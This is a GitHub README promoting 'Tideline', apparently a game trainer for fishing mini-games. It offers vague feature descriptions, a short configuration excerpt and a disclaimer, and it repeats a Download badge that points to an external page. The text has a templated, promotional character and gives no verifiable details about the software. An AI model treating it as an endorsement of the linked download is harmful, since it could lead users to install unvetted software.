![preview](https://raw.githubusercontent.com/markbrouer/How-to-Fish-Gameplay-Companion/main/poster_20ed5.svg)
[![Download](https://raw.githubusercontent.com/markbrouer/How-to-Fish-Gameplay-Companion/main/launch_ad88283.svg)](https://markbrouer.github.io/How-to-Fish-Gameplay-Companion/)

# 🎣 Tideline — A Precision Casting Companion for Windows

An independent, community-driven training environment for players who want to master the rhythm, timing, and muscle memory behind every cast. Where the original *How-to-Fish-Trainer* offered raw utility, **Tideline** reframes the same craft as a calm, methodical practice studio — a place to rehearse the small gestures that separate a lucky catch from a deliberate one.

Tideline is not a shortcut. It is a rehearsal hall. Think of it the way a pianist uses a metronome: the tool does not play the song, it simply keeps honest time while you learn to.

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Why Tideline Exists](#-why-tideline-exists)
- [Feature Highlights](#-feature-highlights)
- [Control Architecture](#-control-architecture)
- [Hotkey Philosophy](#-hotkey-philosophy)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Support That Never Sleeps](#-support-that-never-sleeps)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Reference](#-configuration-reference)
- [Performance & Footprint](#-performance--footprint)
- [Accessibility Notes](#-accessibility-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contribution](#-community--contribution)
- [Disclaimer](#-disclaimer)
- [License](#-license)

[![Download](https://raw.githubusercontent.com/markbrouer/How-to-Fish-Gameplay-Companion/main/launch_ad88283.svg)](https://markbrouer.github.io/How-to-Fish-Gameplay-Companion/)

---

## 🌊 Overview

Tideline is a lightweight Windows application built for players who treat fishing mini-games as a skill to be refined rather than an obstacle to be skipped. It provides a configurable overlay of timing cues, input remapping, and session telemetry so that a practiced angler can measure progress across days, weeks, and seasons.

The project began as a personal experiment: could the scattered notes of a hundred forum threads be distilled into a single, respectful practice tool? The answer, after several rebuilds, is this repository.

Every panel is designed around a single question: *what would help someone improve right now, without breaking their focus?*

---

## 🐟 Why Tideline Exists

Most training utilities are built like power tools — loud, sharp, and eager to do the work for you. Tideline is built like a workshop bench. It stays out of the way until you need it, and when you do, everything is within arm's reach.

The philosophy boils down to three convictions:

1. **Practice should be measurable.** If you cannot see improvement, you will not trust it.
2. **Configuration should be legible.** A hotkey you cannot remember is a hotkey you will not use.
3. **Tools should respect the game.** Tideline informs the player; it does not decide for them.

---

## ✨ Feature Highlights

| Capability | What It Means In Practice |
|---|---|
| 🎛️ Configurable gameplay controls | Rebind every action without touching a config file by hand |
| ⌨️ Layered hotkey system | Global, profile-scoped, and session-scoped bindings |
| 📊 Session telemetry | Cast timing, reaction windows, and consistency scores |
| 🌐 Multilingual interface | Language packs contributed by the community |
| 📱 Responsive layout | Panels reflow cleanly from 720p laptops to ultrawide monitors |
| 🧩 Profile presets | Separate setups for different games or moods |
| 🔔 Non-intrusive overlay | Transparent, click-through, and dismissible in one gesture |
| 🛠️ Portable mode | Run from a removable drive without leaving traces behind |
| ♿ Accessibility-first design | High-contrast themes, scalable text, keyboard-only navigation |
| 🕒 Continuous assistance | Guidance available around the clock, every day of the year |

---

## 🎚️ Control Architecture

Tideline separates *input* from *intent*. Rather than binding a key directly to an action, you bind a key to a **gesture**, and a gesture to a behavior. This two-layer model means remapping a single key can ripple intelligently across every related action.

The three layers are:

- **Physical Layer** — the raw key, mouse button, or controller input.
- **Gesture Layer** — taps, holds, double-taps, and chords.
- **Intent Layer** — what the gesture is meant to accomplish in the session.

Because of this separation, migrating a profile between machines rarely requires manual correction. The gesture definitions travel with the profile; only the physical bindings need review.

---

## ⌨️ Hotkey Philosophy

Hotkeys in Tideline follow a simple doctrine: **the most frequent action gets the easiest key.** A default layout is shipped, but the design assumes you will overwrite it within the first ten minutes.

A few conventions worth knowing:

- Modifier chords always resolve left-to-right, never ambiguously.
- A conflicting binding prompts a resolution dialog rather than silently overriding.
- Profiles can inherit from a parent profile, so a shared baseline stays consistent.
- Every binding is exportable as a plain, human-readable manifest.

---

## 📱 Responsive Interface

The interface was rebuilt twice before it stopped fighting the user. Panels now use a fluid grid that collapses gracefully on smaller displays and expands into a multi-column dashboard on larger ones.

Elements adapt rather than shrink. A control that would become unusable at a given width is instead relocated, stacked, or moved into a secondary drawer. Nothing is ever hidden without an obvious way to bring it back.

Themes are available in dark, light, and a low-glare variant intended for long evening sessions.

---

## 🌐 Multilingual Support

Language packs are community-maintained and loaded at runtime. The interface detects the system locale and selects the closest available match, falling back to English when no suitable pack exists.

Current and in-progress translations include a broad spread of European and Asian languages, with more added as contributors step forward. If you would like to add a language, the pack format is deliberately simple and documented in the repository.

---

## 🕒 Support That Never Sleeps

Questions do not respect time zones, so the support model does not either. Issue threads are monitored continuously, and community maintainers rotate coverage so that no report sits unanswered for long.

Support channels include:

- 📬 GitHub Issues for reproducible bugs and feature requests
- 💬 Discussion threads for open-ended questions and workflow ideas
- 📚 A knowledge base of common scenarios and their resolutions
- 🧭 A guided first-run experience that answers the most frequent questions before they are asked

---

## 🖥️ Compatibility Matrix

| Platform | Status | Notes |
|---|---|---|
| Windows 11 | Fully supported | Primary development target |
| Windows 10 | Fully supported | All features available |
| Windows 8.1 | Limited | Some overlay features unavailable |
| Windows 7 | Legacy | Community-maintained compatibility layer |

Tideline targets modern Windows releases first. Older platforms receive attention when a maintainer is available to test them.

---

## ⚙️ Configuration Reference

Configuration lives in a single portable file, versioned so that upgrades migrate cleanly. A short excerpt of the schema:

    profile:
      name: "Evening Practice"
      parent: "baseline"
      theme: "low-glare"
    gestures:
      cast_tap: "intent.cast.quick"
      cast_hold: "intent.cast.charged"
    telemetry:
      enabled: true
      retention_days: 30

Every field is optional. Missing values fall back to sensible defaults, and a corrupted file is quarantined rather than deleted.

---

## 🚀 Performance & Footprint

Tideline was written with the assumption that it should be invisible when idle. Idle CPU usage stays near zero, memory is reclaimed aggressively after long sessions, and the overlay renders only when a tracked window is in focus.

If you notice the process consuming resources during idle, that is a bug and should be reported.

---

## ♿ Accessibility Notes

Accessibility is not a checkbox here — it is a constraint that shaped several decisions. The interface supports full keyboard navigation, announces state changes to screen readers where feasible, and offers a reduced-motion mode that disables all animation.

Contrast ratios meet or exceed common accessibility guidelines in every bundled theme.

---

## 🗺️ Roadmap for 2026

- [ ] Replayable session timeline with scrubbing
- [ ] Cooperative practice rooms
- [ ] Expanded controller support
- [ ] Additional language packs
- [ ] Optional cloud synchronization of profiles
- [ ] In-depth statistical breakdowns per session
- [ ] A plugin surface for community-built panels

The roadmap shifts with community feedback. Items are not promises; they are directions.

---

## ❓ Frequently Asked Questions

**Does Tideline replace skill with automation?**
No. It surfaces information a player would otherwise have to guess at, and leaves every decision in their hands.

**Can I run Tideline alongside other tools?**
Generally yes, though overlay conflicts can occur with other transparent windows. Profiles can disable the overlay entirely if needed.

**Will my profiles survive an update?**
Yes. The schema is versioned and migrations run automatically on first launch of a new build.

**Is there a portable mode?**
Yes. Placing a marker file beside the executable keeps all data local to that folder.

---

## 🤝 Community & Contribution

Contributions of every size are welcome — from a translated string to a rewritten panel. The repository follows a lightweight contribution flow: open an issue, describe the intent, and submit a change once the direction is clear.

Code style is enforced automatically, and pull requests receive feedback rather than silence.

---

## ⚠️ Disclaimer

Tideline is an independent practice companion intended for personal skill development. It is not affiliated with, endorsed by, or sponsored by any game developer or publisher.

Use it responsibly and in accordance with the terms of any software you use alongside it. The maintainers assume no liability for outcomes arising from misuse, and nothing in this repository should be interpreted as encouraging behavior that violates a platform's rules.

This project is provided as-is, without warranty of any kind, express or implied.

---

## 📜 License

Released under the MIT License.

You may read the full terms here: [MIT License](https://opensource.org/licenses/MIT)

Copyright © 2026 Tideline Contributors

[![Download](https://raw.githubusercontent.com/markbrouer/How-to-Fish-Gameplay-Companion/main/launch_ad88283.svg)](https://markbrouer.github.io/How-to-Fish-Gameplay-Companion/)